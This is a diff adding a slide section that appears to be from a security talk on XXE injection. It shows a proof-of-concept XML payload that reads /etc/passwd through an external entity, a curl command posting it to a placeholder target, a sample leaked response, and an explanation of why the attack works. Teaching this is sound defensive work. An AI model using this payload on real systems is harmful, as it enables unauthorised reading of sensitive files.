@@ -1,0 +1,40 @@
+<section>
+  <h2 class="section-title">Classic PoC &mdash; arbitrary file read</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="card card-red">
+        <div class="card-header">payload.xml</div>
+        <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;user&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/user&gt;</code></pre>
+      </div>
+      <div class="card card-blue" style="margin-top: 12px;">
+        <div class="card-header">$ curl &mdash; send the payload</div>
+        <pre><code class="language-bash">curl -X POST https://target/api/users \
+  -H 'Content-Type: application/xml' \
+  --data-binary @payload.xml</code></pre>
+      </div>
+    </div>
+    <div class="col">
+      <div class="card card-red">
+        <div class="card-header">server response</div>
+        <pre><code class="language-json">{
+  "error": "User not found: ",
+  "name": "root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+..."
+}</code></pre>
+      </div>
+      <div class="textbox" style="margin-top: 12px;">
+        <p><span class="inline-tag tag-red">Why it works</span> The parser resolves <code>&amp;xxe;</code> <strong>before</strong> the app ever sees the data. The app just reads <code>name</code> from the parsed tree &mdash; and dutifully echoes <code>/etc/passwd</code>.</p>
+        <p><span class="inline-tag tag-purple">In-band</span> Works whenever <em>any</em> field of your XML is reflected back &mdash; in JSON, HTML, an error message, anywhere.</p>
+      </div>
+    </div>
+  </div>
+</section>
